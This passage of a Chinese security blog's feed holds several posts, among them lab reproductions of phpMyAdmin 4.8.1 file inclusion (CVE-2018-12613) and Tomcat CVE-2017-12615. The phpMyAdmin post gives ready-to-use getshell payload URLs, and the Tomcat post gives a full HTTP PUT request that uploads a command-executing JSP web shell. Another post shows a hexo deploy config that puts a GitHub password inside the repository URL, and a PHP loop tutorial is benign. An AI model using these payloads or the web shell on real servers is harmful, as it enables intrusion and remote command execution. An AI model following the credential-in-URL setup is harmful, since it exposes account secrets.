      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/tags/Exploit/"/>
    
      <category term="Study" scheme="https://j2ekim.github.io/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin4.8.1 后台文件包含 &amp; Getshell</title>
    <link href="https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/"/>
    <id>https://j2ekim.github.io/2018/06/22/phpMyAdmin_4.8.1_getshell/</id>
    <published>2018-06-21T17:28:16.000Z</published>
    <updated>2018-07-08T16:03:50.041Z</updated>
    
    <content type="html"><![CDATA[<p>2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。<br><a id="more"></a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。<br>该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。<br>攻击者必须经过身份验证，但在这些情况下除外：</p><pre><code>$ cfg [&apos;AllowArbitraryServer&apos;] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码$ cfg [&apos;ServerDefault&apos;] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</code></pre><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1受到影响。</p><h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h2><p><a href="https://www.colabug.com/3307163.html" target="_blank" rel="noopener">CVE-2018-12613 PhpMyadmin后台文件包含分析</a><br><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog" target="_blank" rel="noopener">phpMyAdmin 4.8.1后台getshell</a></p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><h3 id="PHP环境-amp-phpMyAdmin"><a href="#PHP环境-amp-phpMyAdmin" class="headerlink" title="PHP环境 &amp; phpMyAdmin"></a>PHP环境 &amp; phpMyAdmin</h3><p><a href="http://phpstudy.php.cn/phpstudy/PhpStudy20180211.zip" target="_blank" rel="noopener">phpMyStudy</a>   （切换 PHP 5.4以上版本才能运行phpMyAdmin 4.8.1）<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">phpMyAdmin 4.8.1</a></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>结合以上两篇文章，共有4种getshell的方法<br>第一个是上传 sql文件，然后包含mysql的sql文件。<br>第二个是开启 general_log 来完成getshell。<br>第三种是包含 phpsession 文件<br>第四种是创建字段，包含sql文件(类似第一种)。<br>不过第一、二种思路都有些繁琐，最简单的思路是p牛在知识星球中发出的。<br>下文将会复现第三、四种方法。</p><h3 id="复现思路三"><a href="#复现思路三" class="headerlink" title="复现思路三"></a>复现思路三</h3><p>下面复现下第三种思路:</p><p>首先在sql中select ‘要执行的代码’<br><img src="/img/phpMyAdmin_4.8.1_getshell/select_sql.png"></p><p>要包含 session 的文件名可以在 cookie 中的phpmyadmin参数找到。<br><img src="/img/phpMyAdmin_4.8.1_getshell/phpsession.png"></p><p>可以看到，本地文件名前多了个 ‘sess_’,包含之<br><img src="/img/phpMyAdmin_4.8.1_getshell/include_phpsession.png"></p><p>Payload:</p><pre><code>http://localhost/phpmyadminTest/index.php?j2=phpinfo()&amp;target=db_sql.php%253f/../../../tmp/tmp/sess_session值</code></pre><h3 id="复现思路四"><a href="#复现思路四" class="headerlink" title="复现思路四"></a>复现思路四</h3><p>创建一个新表，新增一个字段，字段名为 php 语句。<br><img src="/img/phpMyAdmin_4.8.1_getshell/date.png"></p><p>数据库绝对路径：C:\phpStudy\PHPTutorial\MySQL\data\getshell<br><img src="/img/phpMyAdmin_4.8.1_getshell/find_file_fuck.frm.png"><br>可以看到，刚刚的字段名被记录到fuck.frm文件里</p><p>包含之<br><img src="/img/phpMyAdmin_4.8.1_getshell/include_file.png"></p><p>Payload:</p><pre><code>http://127.0.0.1/phpmyadmin/index.php?x=phpinfo();&amp;target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/getshell/fuck.frm</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个文件包含漏洞确实挺有意思，学习到不少姿势。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/Exploit/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/tags/Exploit/"/>
    
      <category term="getshell" scheme="https://j2ekim.github.io/tags/getshell/"/>
    
      <category term="Study" scheme="https://j2ekim.github.io/tags/Study/"/>
    
      <category term="phpMyAdmin" scheme="https://j2ekim.github.io/tags/phpMyAdmin/"/>
    
  </entry>
  
  <entry>
    <title>使用 hexo 时遇到的各种坑</title>
    <link href="https://j2ekim.github.io/2018/04/02/hexo_error_note/"/>
    <id>https://j2ekim.github.io/2018/04/02/hexo_error_note/</id>
    <published>2018-04-02T11:30:09.000Z</published>
    <updated>2018-04-02T14:09:32.730Z</updated>
    
    <content type="html"><![CDATA[<p> 记录一下自己使用hexo时遇到的各种坑。<br> <a id="more"></a></p><h1 id="使用hexo时遇到的错误记录"><a href="#使用hexo时遇到的错误记录" class="headerlink" title="使用hexo时遇到的错误记录"></a>使用hexo时遇到的错误记录</h1><h2 id="1-上传到github时报错"><a href="#1-上传到github时报错" class="headerlink" title="1.上传到github时报错"></a>1.上传到github时报错</h2><p>去年搭建的博客，前段时间突然想写博客，结果<code>hexo d</code>上传不上去。</p><p><img src="/img/hexo_error_note/hexo_upload_error.jpg" width="700" align="center"></p><p>于是百度了一下，最后在知乎大牛的帮助下，把这个问题解决了。<br><a href="&quot;https://www.zhihu.com/question/38219432&quot;">知乎原帖在这里</a></p><blockquote><p>修改配置文件：根目录下的_config.yml，修改deploy节点。<br>原来的配置为：<br>deploy:<br> type: git   repo: <a href="https://github.com/{yourname}/{yourname}.github.io.git" target="_blank" rel="noopener">https://github.com/{yourname}/{yourname}.github.io.git</a><br> branch: master修改为如下：<br>deploy:<br> type: git<br> repo: https://{yourname}:<a href="mailto:{yourpassword}@github.com" target="_blank" rel="noopener">{yourpassword}@github.com</a>/{yourname}/{yourname}.github.io.git<br> branch: master</p></blockquote><p>根据上面的提示，修改后如下图<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hexo_error_note/hexo_config_img.jpg" alt="配置图" title="">                </div>                <div class="image-caption">配置图</div>            </figure></p><p>hexo d之后上传完成<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hexo_error_note/hexo_upload_success.jpg" alt="上传完成" title="">                </div>                <div class="image-caption">上传完成</div>            </figure></p><p>待续。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 记录一下自己使用hexo时遇到的各种坑。&lt;br&gt;
    
    </summary>
    
      <category term="hexo note" scheme="https://j2ekim.github.io/categories/hexo-note/"/>
    
    
      <category term="hexo note" scheme="https://j2ekim.github.io/tags/hexo-note/"/>
    
  </entry>
  
  <entry>
    <title>几个经典的php循环案例</title>
    <link href="https://j2ekim.github.io/2018/03/15/php_For&amp;Witch/"/>
    <id>https://j2ekim.github.io/2018/03/15/php_For&amp;Witch/</id>
    <published>2018-03-15T15:31:38.000Z</published>
    <updated>2018-04-02T14:07:32.140Z</updated>
    
    <content type="html"><![CDATA[<p>在学习中碰到过的比较经典的几个案例。<br>不管学什么语言都好，都可能会做类似的例子<br><a id="more"></a></p><h2 id="For循环"><a href="#For循环" class="headerlink" title="For循环"></a>For循环</h2><h3 id="99乘法表"><a href="#99乘法表" class="headerlink" title="99乘法表"></a>99乘法表</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i &lt;=<span class="number">9</span>; $i++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">1</span>; $j &lt;= $i; $j++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$j&#125; * &#123;$i&#125; ="</span>. ($i* $j).<span class="string">"  "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="金字塔案例"><a href="#金字塔案例" class="headerlink" title="金字塔案例"></a>金字塔案例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//金字塔</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">6</span>; $i++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($k=<span class="number">1</span>; $k &lt;=<span class="number">6</span>-$i ; $k++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">1</span>; $j&lt;=$i*<span class="number">2</span><span class="number">-1</span>  ; $j++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"*"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//倒金字塔</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">6</span>; $i&gt;=<span class="number">1</span>; $i--) &#123;</span><br><span class="line"><span class="keyword">for</span> ($k=<span class="number">1</span>; $k &lt;=<span class="number">6</span>-$i ; $k++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&amp;nbsp;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">1</span>; $j&lt;=$i*<span class="number">2</span><span class="number">-1</span>; $j++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"*"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="空心菱形"><a href="#空心菱形" class="headerlink" title="空心菱形"></a>空心菱形</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//空心菱形</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">6</span>; $i++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($k=<span class="number">1</span>; $k &lt;=<span class="number">6</span>-$i ; $k++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">1</span>; $j&lt;=$i*<span class="number">2</span><span class="number">-1</span> ; $j++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($i==<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"*"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($j == <span class="number">1</span> || $j == $i*<span class="number">2</span><span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"*"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-"</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//倒空心菱形</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">6</span>; $i&gt;=<span class="number">1</span>; $i--) &#123;    <span class="comment">// ++ -- 的区别</span></span><br><span class="line"><span class="keyword">for</span> ($k=<span class="number">1</span>; $k &lt;=<span class="number">6</span>-$i ; $k++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">1</span>; $j&lt;=$i*<span class="number">2</span><span class="number">-1</span> ; $j++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($i==<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"*"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($j == <span class="number">1</span> || $j == $i*<span class="number">2</span><span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"*"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-"</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对折案例"><a href="#对折案例" class="headerlink" title="对折案例"></a>对折案例</h3><p>一张纸的厚度是0.01毫米，则该纸对折30次后事多厚,反过来，一张纸对折多少次后，能超过1米厚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一张纸的厚度是0.01毫米，则该纸对折30次后事多厚</span></span><br><span class="line"><span class="comment">//反过来，一张纸对折多少次后，能超过1米厚</span></span><br><span class="line">$h = <span class="number">0.01</span> / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i &lt;=<span class="number">30</span> ; $i++) &#123;</span><br><span class="line">$h *=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"对折&#123;$i&#125;次，是&#123;$h&#125;米&lt;br / &gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($h &gt;=<span class="number">1</span> &amp;&amp; $h&lt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"对折&#123;$i&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="三五案例"><a href="#三五案例" class="headerlink" title="三五案例"></a>三五案例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">100</span> ; $i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($i%<span class="number">3</span>==<span class="number">0</span> &amp;&amp; $i%<span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"三五"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($i%<span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"三"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($i%<span class="number">5</span>==<span class="number">0</span> ) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"五"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$i"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br></pre></td></tr></table></figure><h2 id="Witch循环"><a href="#Witch循环" class="headerlink" title="Witch循环"></a>Witch循环</h2><h3 id="99乘法表-1"><a href="#99乘法表-1" class="headerlink" title="99乘法表"></a>99乘法表</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ($i&lt;=<span class="number">9</span>) &#123;</span><br><span class="line">$j = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ($j&lt;=$i) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$i*$j="</span>.$j*$i.<span class="string">'&amp;nbsp;'</span>;</span><br><span class="line">$j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过路费案例"><a href="#过路费案例" class="headerlink" title="过路费案例"></a>过路费案例</h3><p>假设某人有10w现金。每经过一个路口需要进行一次交费。<br>当他金额大于5w时，每次需要交5%，如果现金小于5w时，每次交5000，那么此人可以经过多少个路口？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$money = <span class="number">100000</span>;</span><br><span class="line">$i =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ($money &gt;=<span class="number">5000</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ($money &gt;<span class="number">50000</span>) &#123;</span><br><span class="line">$money *= <span class="number">0.95</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($money &lt;= <span class="number">50000</span>) &#123;</span><br><span class="line">$money -= <span class="number">5000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"每次剩余&#123;$money&#125;,过路&#123;$i&#125;次&lt;br /&gt;"</span>;</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在学习中碰到过的比较经典的几个案例。&lt;br&gt;不管学什么语言都好，都可能会做类似的例子&lt;br&gt;
    
    </summary>
    
      <category term="PHP" scheme="https://j2ekim.github.io/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Study" scheme="https://j2ekim.github.io/tags/Study/"/>
    
      <category term="Code" scheme="https://j2ekim.github.io/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-12615漏洞本地复现</title>
    <link href="https://j2ekim.github.io/2018/02/23/CVE-2017-12615_exploit/"/>
    <id>https://j2ekim.github.io/2018/02/23/CVE-2017-12615_exploit/</id>
    <published>2018-02-22T17:28:16.000Z</published>
    <updated>2019-07-23T03:39:36.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞背景"><a href="#0x00-漏洞背景" class="headerlink" title="0x00 漏洞背景"></a>0x00 漏洞背景</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><p>2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，漏洞CVE编号:CVE-2017-12615和CVE-2017-12616,该漏洞受影响版本为7.0-7.80之间，在一定条件下，攻击者可以利用这两个漏洞，获取用户服务器上 JSP 文件的源代码，或是通过精心构造的攻击请求，向用户服务器上传恶意JSP文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。</p><h2 id="0x01漏洞简介"><a href="#0x01漏洞简介" class="headerlink" title="0x01漏洞简介"></a>0x01漏洞简介</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p><p>大家可以先了解一下put请求：</p><p>PUT方法请求服务器去把请求里的实体存储在请求URI（Request-URI）标识下。</p><p>如果请求URI（Request-URI）指定的的资源已经在源服务器上存在，那么此请求里的实体应该被当作是源服务器关于此URI所指定资源实体的最新修改版本。如果请求URI（Request-URI）指定的资源不存在，并且此URI被用户代理定义为一个新资源，那么源服务器就应该根据请求里的实体创建一个此URI所标识下的资源。<br>如果一个新的资源被创建了，源服务器必须能向用户代理（user agent） 发送201（已创建）响应。如果已存在的资源被改变了，那么源服务器应该发送200（Ok）或者204（无内容）响应。</p><p>如果资源不能根据请求URI创建或者改变，一个合适的错误响应应该给出以反应问题的性质。实体的接收者不能忽略任何它不理解和不能实现的Content-*（如：Content-Range）头域，并且必须返回501（没有被实现）响应。如果请求穿过一个缓存（cache），并且此请求URI（Request-URI）指示了一个或多个当前缓存的实体，那么这些实体应该被看作是旧的。PUT方法的响应是不可缓存的。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>Apache Tomcat 7.0.0 to 7.0.79</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>Tomcat 的 Servlet 是在 conf/web.xml 配置的。我们找到配置文件可以看到，定义了default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。<br>Tomcat 的 Servlet 是在 conf/web.xml 配置的。我们找到配置文件可以看到，定义了default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。<br>image<br>image<br>当服务端接收到一个http请求时候，httpservlet会被调用。</p><p>其实是调用了servlet的service方法，</p><p>service()（根据请求方法不同调用doGet() 或者 doPost()，此外还有doHead()、doPut()、doTrace()、doDelete()、doOptions()、destroy())。</p><p>也就是当我们使用put请求方法时，其会调用doPut()</p><p>我们看一下doPut()方法的源码：可以看到这里如果readonly是true就直接进入error了，所以需要设置成false。<br>sendError(int errnum )说明：用来向客户端发送错误信息<br>SC_FORBIDDEN，状态码是403，表示服务器明白客户的请求，但拒绝响应。</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>打开Tomcat安装目录下的 /conf/web.xml 添加如下配置<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>上传姿势一：</p><p>参考思路:微软MSDN上关于NTFS Streams的一段资料<a href="https://msdn.microsoft.com/en-us/library/dn393272.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/dn393272.aspx</a></p><p>大概意思:</p><p>NTFS卷上的所有文件至少包含一个流 - 主流 - 这是存储数据的普通可查看文件。流的全名是以下形式。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filename</span>&gt;</span>：<span class="tag">&lt;<span class="name">stream</span> <span class="attr">name</span>&gt;</span>：<span class="tag">&lt;<span class="name">stream</span> <span class="attr">type</span>&gt;</span></span><br></pre></td></tr></table></figure><p>默认数据流没有名称。也就是说，名为sample.txt的文件的默认流的完全限定名称是ample.txt :: $ DATA，因为sample.txt是文件的名称，$ DATA&amp;是流类型。</p><p>用户可以在文件中创建命名流，并将$ DATA创建为合法名称。这意味着对于此流，全名是sample.txt：$ DATA：$ DATA。如果用户创建了名为bar的命名流，则其全名为sample.txt：bar：$ DATA。文件名的任何合法字符对于流名称（包括空格）都是合法的。</p><p>对于目录，没有默认数据流，但有一个默认目录流。目录是流类型$ INDEX_ALLOCATION。$ INDEX_ALLOCATION类型（目录流）的默认流名称是$ I30。（这与$ DATA流的默认流名称形成对比，后者具有空的流名称。）以下是等效的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dir C：\ Users</span><br><span class="line">Dir C：\ Users：$ I30：$ INDEX_ALLOCATION</span><br><span class="line">Dir C：\ Users :: $ INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>虽然目录没有默认数据流，但它们可以具有命名数据流。这些备用数据流通常不可见，但可以使用DIR命令的/ R选项从命令行观察。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp::$DATA HTTP/1.1</span><br><span class="line">Host: 172.26.1.8:8080</span><br><span class="line">Content-Length: 662</span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure></p><p>我们利用burpsuite来发送我们的payload<br><img src="https://forum.90sec.com/uploads/default/original/1X/9768fbcc27515efcb0fcedaf39213e52ed1d65d3.png"><br>可以看到返回响应码201，说明我们上传成功了。我们访问我们jsp脚本试试：<br><img 